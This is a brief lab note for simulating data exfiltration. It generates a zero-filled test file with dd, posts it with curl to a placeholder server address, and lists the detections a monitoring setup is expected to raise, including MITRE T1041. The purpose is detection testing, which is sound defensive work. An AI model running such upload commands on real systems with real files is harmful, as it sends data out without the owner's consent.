# Data Exfiltration Simulation

Run only inside your own lab.

```bash
dd if=/dev/zero of=testfile.bin bs=1M count=5
curl -X POST --data-binary @testfile.bin http://<server-ip>/upload
```

Expected detection:

- Suspicious Outbound Data Transfer
- MITRE T1041
- Large outbound byte count
